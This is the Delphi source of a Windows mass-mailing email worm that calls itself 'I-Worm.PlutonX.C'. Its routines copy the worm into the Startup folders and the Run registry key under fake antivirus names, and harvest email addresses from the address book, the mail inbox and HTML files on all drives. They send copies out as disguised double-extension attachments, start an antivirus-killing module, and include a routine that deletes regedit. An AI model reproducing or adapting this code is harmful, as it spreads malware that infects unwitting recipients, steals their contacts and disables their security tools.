PROGRAM PlutonX;

USES
  sClasses in 'ACLUnits\SCLASSES.PAS',
  Registry in 'ACLUnits\REGISTRY.PAS',
  AclUtils in 'ACLUnits\ACLUTILS.PAS',
  P2P in 'P2P.PAS',
  LAN in 'LAN.pas',
  Utils in 'UTILS.PAS',
  Email in 'EMAIL.PAS',
  KillAV in 'KILLAV.PAS',
  GetProc in 'GETPROC.PAS',
  MainStrings in 'MAINSTRINGS.PAS',
  Windows;

VAR
  Emails                : TStrings;
  Msg                   : TMsg;
  ApplicationHandle     : HWND;
  SendMailBusy          : BOOL;
  WABExists             : BOOL;
  PlutonxRegKey         : STRING;
  Extensions1           : XArray;
  Extensions2           : XArray;
  Bodys                 : XArray;
  ErrorMessages         : XArray;
  Attachments           : XArray;
  Subjects              : XArray;
  SentEmail             : WORD;
  NumberOfExtensions1   : WORD;
  NumberOfExtensions2   : WORD;
  NumberOfBodys         : WORD;
  NumberOfErrorMessages : WORD;
  NumberOfAttachments   : WORD;
  NumberOfSubjects      : WORD;

{$I RESOURCES\TEXTENSIONS1.INI}
{$I RESOURCES\TEXTENSIONS2.INI}
{$I RESOURCES\TERRORMESSAGES.INI}
{$I RESOURCES\TATTACHMENTS.INI}
{$I RESOURCES\TSUBJECTS.INI}
{$I RESOURCES\TBODYS.INI}

FUNCTION RandomFileName : STRING;
VAR
  I : BYTE;
BEGIN
  FOR I:=1 TO Random(10)+5 DO RESULT:=RESULT+Chars[Random(61)+1];
  RESULT:=RESULT+MainStr[5];                                                    //".exe"
END;

PROCEDURE InfectStartUpDir;
VAR
  I : BYTE;
  S : STRING;
BEGIN
  FOR I:=0 TO 1 DO BEGIN
    Reg.RootKey:=HKEY_CURRENT_USER+1;
    Reg.OpenKey(SoftwareMic+MainStr[29],True);                                  //"Windows\CurrentVersion\explorer\Shell Folders"
    S:=Reg.ReadString(MainStr[27+I*3])+'\';                                     //"Startup","Common Startup"
    IF S<>'' THEN CopyFiles(True,S+RandomFileName);
    Reg.CloseKey;
  END;
END;

PROCEDURE RegWinStart;
VAR
  I : BYTE;
  S : STRING;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(SoftwareMic+MainStr[35],True);                                    //"Windows\CurrentVersion\Run"
  S:=AVName[Random(NumberOfAVNames)];
  I:=Pos('.',S);
  IF I>0 THEN SetLength(S,I-1);
  Reg.WriteString(S,Winpath+RandomFileName);
  Reg.CloseKey;
  CopyFiles(True,Winpath+RandomFileName);
END;

PROCEDURE QuickSort(Left,Right:WORD);
VAR
  Up,Down : WORD;
  Compare : STRING;
BEGIN
  Up:=Left;Down:=Right;Compare:=Emails.Strings[(Left+Right) DIV 2];
  REPEAT
    WHILE Emails.Strings[Up]<Compare DO Inc(Up);
    WHILE Compare<Emails.Strings[Down] DO Dec(Down);
    IF Up<=Down THEN BEGIN
      Emails.Exchange(Up,Down);
      Inc(Up);Dec(Down);
    END;
  UNTIL Up>Down;
  IF Left<Down THEN QuickSort(Left,Down);
  IF Up<Right  THEN QuickSort(Up,Right);
  FOR Down:=Emails.Count-2 DOWNTO 0 DO IF Emails.Strings[Down]=Emails.Strings[Down+1] THEN Emails.Delete(Down);  //Kill Dupes
END;

FUNCTION GetPlutonXRegKey : STRING;
VAR
  I    : DWORD;
  O    : WORD;
  Keys : TStrings;
BEGIN
  Keys:=TStringList.Create;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(MainStr[39],False);                                               //"\SOFTWARE"
  Reg.GetKeyNames(Keys);

  FOR I:=0 TO Keys.Count-1 DO
    FOR O:=1 TO NumberOfAVNames DO
      IF(Keys.Strings[I]=Copy(AVName[O],1,Pos('.',AVName[O])-1))AND(Reg.KeyExists(Keys.Strings[I]))AND(Keys.Strings[I]<>'') THEN BEGIN
        Reg.OpenKey(Software+Keys.Strings[I],False);
        IF(Reg.ValueExists(MainStr[38]))AND(Reg.ValueExists(MainStr[37])) THEN RESULT:=Keys.Strings[I]; //"Sent","email_num"
      END;

  IF RESULT='' THEN BEGIN
    RESULT:=AVName[Random(NumberOfAVNames-1)+1];
    I:=POS('.',RESULT);
    IF I>0 THEN SetLength(RESULT,I-1);
  END;

  Keys.Free;
  Reg.CloseKey;
END;

PROCEDURE ReadWAB;
VAR
  F       : FILE;
  I       : DWORD;
  S       : STRING;
  N       : ARRAY[1..5] OF Char;
  Buf     : ARRAY[1..500] OF Char;
  WABPath : STRING;
BEGIN
  Reg.RootKey:=HKEY_CURRENT_USER;
  Reg.OpenKey(SoftwareMic+MainStr[36],False);                                   //"WAB\WAB4\WAB File Name"
  WABPath:=Reg.ReadString('');
  IF(WABPath<>'')AND(FileExists(WABPath)) THEN BEGIN
    WABExists:=True;
    AssignFile(F,WABPath);
    Reset(F,1);
    Seek(F,176199);
    REPEAT
      BlockRead(F,N,5);
      IF N[1]+N[2]+N[3]+N[4]=#01#31#00#03 THEN BEGIN
        BlockRead(F,Buf,Ord(N[5])+30);
        S:='';
        FOR I:=1 TO Ord(N[5])+30 DO S:=S+Buf[I];
        Delete(S,1,3);
        I:=Pos(#00#00#00,S);
        IF I>0 THEN Delete(S,I,Length(S)-I+1);
        FOR I:=1 TO Ord(N[5]) DO IF S[I]=#00 THEN Delete(S,I,1);
        IF (Pos('@',S)>0)AND(S[1]<>'/') THEN Emails.ADD(UpperCase(S));
      END ELSE Seek(F,FilePos(F)-4);
    UNTIL FileSize(F)-FilePos(F)<6;
    QuickSort(0,Emails.Count-1);
  END;
  IF NOT FileExists(WABPath) THEN WABExists:=False;
  CloseFile(F);
  Reg.CloseKey;
END;

PROCEDURE WriteEmailsReg;
VAR
  I : DWORD;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(Software+PlutonXRegKey,True);
  FOR I:=0 TO Emails.Count-1 DO Reg.WriteString(IntToStr(I),Emails.Strings[I]);
  Reg.WriteInteger(MainStr[37],Emails.Count);                                   //"email_num"
  Reg.WriteInteger(MainStr[38],SenteMail);                                      //"sent"
  Reg.CloseKey;
END;

PROCEDURE ReadEmailsReg;
VAR
  I : DWORD;
BEGIN
  SentEmail:=0;
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  IF Reg.OpenKey(Software+PlutonXRegKey,False) THEN BEGIN
    SentEmail:=Reg.ReadInteger(MainStr[38]); //"sent"
    FOR I:=0 TO Reg.ReadInteger(MainStr[37])-1 DO Emails.Add(Reg.ReadString(IntToStr(I))); //"email_num"
  END;
  Reg.CloseKey;
END;

FUNCTION GetFirstRun : BOOL;
BEGIN
  Reg.RootKey:=HKEY_LOCAL_MACHINE;
  Reg.OpenKey(MainStr[39],false);                                               //"\Software"
  RESULT:=NOT Reg.KeyExists(PlutonXRegKey);
  Reg.CreateKey(PlutonxRegKey);
  Reg.CloseKey;
END;

PROCEDURE ReadInbox;
VAR
  OSInfo                    : TOSVersionInfo;
  MAPIMessage               : TMAPIMessage;
  lppMAPIMessage            : PMAPIMessage;
  MapiSession               : DWORD;
  bFindFirst                : BOOL;
  sSeedMessageID,sMessageID : lpup;
  I                         : BYTE;
BEGIN
  OSInfo.dwOSVersionInfoSize:=SizeOf(OSInfo);
  GetVersionEx(OSInfo);
  Reg.RootKey:=HKEY_CURRENT_USER;
  IF OSInfo.dwPlatformId=VER_PLATFORM_WIN32_NT THEN Reg.OpenKey(SoftwareMic+MainStr[40],False) //"Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles"
  ELSE Reg.OpenKey(SoftwareMic+MainStr[42],False);                              //"Windows Messaging Subsystem\Profiles"
  TRY
    IF (MapiLogOn(0,pChar(Reg.ReadString(MainStr[41])),NIL,MAPI_NEW_SESSION,0,MapiSession)<>SUCCESS_SUCCESS) THEN Exit; //"DefaultProfile"
  EXCEPT
  END;
  bFindFirst:=True;
  FOR I:=1 TO 50 DO TRY
    IF bFindFirst THEN bFindFirst:=False ELSE sSeedMessageID:=sMessageID;
    IF MapiFindNext(MapiSession,0,NIL,sSeedMessageID,0,0,sMessageID)=SUCCESS_SUCCESS THEN BEGIN
      lppMapiMessage:=@MAPIMessage;
      IF (MAPIReadMail(MAPISession,0,@sMessageID,MAPI_ENVELOPE_ONLY,0,lppMapiMessage)=SUCCESS_SUCCESS)AND(lppMapiMessage.lpRecips<>NIL) THEN Emails.Add(UpperCase(lppMapiMessage.lpOriginator.lpszAddress));
    END;
  EXCEPT
  END;
  QuickSort(0,Emails.Count-1);
  WriteEmailsReg;
  TRY
    MapiLogOff(MapiSession,0,0,0);
  EXCEPT
  END;
  Reg.CloseKey;
END;

PROCEDURE SendEmail;
BEGIN
  IF(InternetGetConnectedState(NIL,0))AND(Emails.Count>1)AND(SendMailBusy=False) THEN BEGIN
    SendMailBusy:=True;
    IF SentEmail>Emails.Count-1 THEN SentEmail:=0;
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKey(Software+PlutonXRegKey,True);
    Reg.WriteInteger(MainStr[38],SentEmail);                                    //"Sent"
    Reg.CloseKey;
    TRY
      Email.SendEmail(Subjects[Random(NumberOfSubjects-1)+1],Bodys[Random(NumberOfBodys-1)+1],Emails[SentEmail],WinPath,Attachments[Random(NumberOfAttachments-1)+1]+'.'+Extensions1[Random(NumberOfExtensions1-1)+1]+'.'+Extensions2[Random(NumberOfExtensions2-1)+1]);
      Inc(SentEmail);
    EXCEPT
    END;
  END;
  SendMailBusy:=False;
END;

PROCEDURE ClearEmail(S:STRING);
VAR
  I : WORD;
  C : Char;
BEGIN
  FOR I:=Pos('@',S)+1 TO Length(S) DO
    IF ((S[I]<'a')OR(S[I]>'z'))AND((S[I]<'0')OR(S[I]>'9'))AND((S[I]<'A')OR(S[I]>'Z'))AND(S[I]<>'.')AND(S[I]<>'-')AND(S[I]<>'_') THEN BEGIN
      Delete(S,I,Length(S));
      Break;
    END;
  C:=S[1];
  IF ((C>='A')AND(C<='Z'))OR((C>='a')AND(C<='z')) THEN
  IF (Pos('@',S)>0)AND(Pos('?',S)=0)AND(Pos('%',S)=0)AND(Pos('$',S)=0)AND(Pos(':',S)=0)AND(Pos(' ',S)=0) THEN Emails.Add(S);
END;

PROCEDURE FindMail(EFile:AnsiString);
VAR
  F : TextFile;
  I : WORD;
BEGIN
  IF FileExists(EFile) THEN BEGIN
    AssignFile(F,EFile);
    Reset(F);
    REPEAT
      ReadLn(F,EFile);
      EFile:=UpperCase(EFile);
      I:=Pos('LTO:',EFile);
      IF I>0 THEN BEGIN
        Delete(EFile,1,I+3);
        I:=Pos('"',EFile);
        IF I>0 THEN Delete(EFile,I,Length(EFile));
        ClearEmail(EFile);
      END;
    UNTIL EOF(F);
    CloseFile(F);
  END;
END;

PROCEDURE SearchAllDirs(Path,fSpec:AnsiString);
VAR
  D     : TSearchRec;
  Error : Integer;
BEGIN
  Error:=FindFirst(Path+fSpec,faAnyFile,D);
  WHILE Error=0 DO BEGIN
    FindMail(Path+D.Name);
    Error:=FindNext(D);
  END;
  Error:=FindFirst(Path+'*.*',faDirectory OR faHidden,D);
  WHILE Error=0 DO BEGIN
    IF (D.Attr=faDirectory)AND(D.Name[1]<>'.') THEN SearchAllDirs(Path+D.Name+'\',fSpec);
    Error:=FindNext(D);
  END;
END;

PROCEDURE SearchAllDir;
VAR
  I : BYTE;
BEGIN
  FOR I:=Ord('c') TO Ord('z') DO IF GetDriveType(pChar(Chr(I)+':\'))=DRIVE_FIXED THEN SearchAllDirs(Chr(I)+':\','*.htm');
END;

PROCEDURE DelRegedit;
BEGIN
  IF FileExists(WinPath+MainStr[44]) THEN DeleteFile(pChar(WinPath+MainStr[44]));  //"regedit.exe"
END;

PROCEDURE InitTimers;
BEGIN
//SetTimer(ApplicationHandle,2,60000,@SendEmail);
  SetTimer(ApplicationHandle,3,04000,@KillAV.AVKiller);
END;

PROCEDURE StartWorm;
VAR
  FirstRun : BOOL;
BEGIN
  Software:=pChar(MainStr[46]);                                                 //"\SOFTWARE\"
  SoftwareMic:=pChar(MainStr[47]);                                              //"\SOFTWARE\Microsoft\"
  InitProcesses;
  InitEmailProcesses;
  NumberOfExtensions1:=DecodeStrings(TExtensions1,Extensions1);
  NumberOfExtensions2:=DecodeStrings(TExtensions2,Extensions2);
  NumberOfBodys:=DecodeStrings(TBodys,Bodys);
  NumberOfErrorMessages:=DecodeStrings(TErrorMessages,ErrorMessages);
  NumberOfAttachments:=DecodeStrings(TAttachments,Attachments);
  NumberOfSubjects:=DecodeStrings(TSubjects,Subjects);
  NumberOfAVNames:=DecodeStrings(TAVName,AVName);
  ApplicationHandle:=GetStdHandle(STD_OUTPUT_HANDLE);
  SetWinPath;
//  DelRegedit;
  SendMailBusy:=False;
  Randomize;
  Reg:=TRegistry.Create;
  PlutonXRegKey:=GetPlutonxRegKey;
  Emails:=TStringList.Create;
//  KillAV.AVKiller;
 FirstRun:=GetFirstRun;
 { IF FirstRun THEN IF Pos('STARTUP',UpperCase(Paramstr(0)))=0 THEN MessageBox(ApplicationHandle,pChar(ErrorMessages[Random(NumberOfErrorMessages-1)+1]),'Error',MB_ICONHAND)
  ELSE InitTimers;
  InitPeerToPeer;
  InfectStartUpDir;
  IF FirstRun THEN BEGIN
    RegWinStart;
    SearchAllDir;
    ReadWab;
    ReadInBox;
  END ELSE BEGIN
    ReadEmailsReg;
    ReadInBox;
  END;
  hThread:=BeginThread(NIL,0,@RunThread,NIL,0,ThreadId);}
END;

BEGIN
  INITS;                                                                        // Decode The Main Strings
  IF WaitForSingleObject(CreateMutexA(NIL,False,pChar(MainStr[45])),0)<>Wait_TimeOut THEN StartWorm; //"I-Worm.PlutonX.C"
  WHILE GetMessage(Msg,0,0,0) DO DispatchMessage(Msg);
END.
